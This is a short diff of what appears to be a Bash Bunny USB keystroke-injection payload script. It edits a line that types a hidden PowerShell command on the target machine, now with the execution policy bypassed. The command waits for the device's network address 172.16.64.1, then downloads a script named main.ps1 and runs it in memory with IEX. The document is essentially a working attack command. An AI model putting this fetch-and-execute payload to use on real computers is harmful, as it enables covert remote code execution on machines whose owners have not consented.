@@ -74,7 +74,7 @@ Q ENTER
 LED STAGE2
 Q DELAY 500
 # Wait for Bunny Ethernet and Start main.ps1 Powershell Script
-Q STRING "powershell -W HIDDEN \"while (1) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { IEX (New-Object Net.WebClient).DownloadString('http://172.16.64.1/main.ps1');exit} }\""
+Q STRING "powershell -exec bypass -W HIDDEN \"while (1) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { IEX (New-Object Net.WebClient).DownloadString('http://172.16.64.1/main.ps1');exit} }\""
 Q DELAY 200
 Q ENTER
 
